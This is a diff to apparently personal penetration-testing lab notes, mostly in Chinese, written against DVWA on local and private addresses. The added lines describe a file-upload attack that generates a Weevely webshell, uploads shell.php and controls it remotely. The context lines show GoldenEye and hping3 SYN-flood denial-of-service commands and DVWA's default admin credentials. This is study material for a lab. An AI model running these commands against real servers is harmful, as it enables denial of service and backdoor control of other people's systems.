@@ -142,8 +142,26 @@ python3 goldeneye.py http://192.168.0.132:8000/
 
 hping3（SYN Flood） 洪水型攻擊 但似乎有點沒用
 sudo hping3 -S --flood -V -p 8000 192.168.0.132
+
 -------------------
+
 DVWA Agent -> account:admin password:password \n
 
 文件上傳攻擊 Upload attack
+
+在 Kali Linux 裡，Weevely 是一個常見的 webshell 工具，用來建立後門、遠端控制網站伺服器。
+
+weevely generate <password> <output_file>
+
+在目標文件上傳 shell.php
+
+啟動: weevely http://localhost:8080/hackable/uploads/shell.php 123456
+
+the latest weevely need to fix the import telnetlib, just comment it.
+
+sudo nano /usr/share/weevely/modules/backdoor/tcp.py
+
+control the webshell
+
+weevely http://localhost:8080/hackable/uploads/shell.php 123456
 
